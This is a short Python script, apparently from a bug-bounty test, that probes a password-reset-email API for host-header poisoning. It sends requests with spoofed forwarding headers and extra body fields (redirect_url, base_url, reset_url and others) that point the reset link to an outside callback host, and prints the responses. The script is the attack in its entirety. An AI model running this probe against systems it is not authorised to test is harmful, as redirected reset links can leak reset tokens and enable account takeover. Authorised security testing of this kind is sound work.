import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
OAST=os.environ['OAST']; WH=os.environ['WH']
ME="golden-snow-4771@bugcrowdninja.com"
def req(body,hdr=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X','POST',
         H+'/api/v1/users/password-reset-email','-H',BB,'-H','Content-Type: application/json']
    if hdr:
        for k,v in hdr.items(): cmd+=['-H',f'{k}: {v}']
    cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== Host-header poisoning on password-reset-email ===")
tests=[
 ("X-Forwarded-Host",{'X-Forwarded-Host':OAST}),
 ("X-Host",{'X-Host':OAST}),
 ("Forwarded",{'Forwarded':f'host={OAST}'}),
 ("X-Forwarded-Server",{'X-Forwarded-Server':OAST}),
 ("X-Original-Host",{'X-Original-Host':OAST}),
]
for label,h in tests:
    c,b=req({"email":ME},h)
    print(f"  {label:20} -> {c} {b[:120].replace(chr(10),' ')}")
print("\n=== extra body params (redirect/host/base_url) ===")
for extra in [{"redirect_url":WH},{"host":OAST},{"base_url":f"https://{OAST}"},
              {"reset_url":WH},{"domain":OAST}]:
    body={"email":ME}; body.update(extra)
    c,b=req(body)
    print(f"  {json.dumps(extra)[:52]:54} -> {c} {b[:110].replace(chr(10),' ')}")
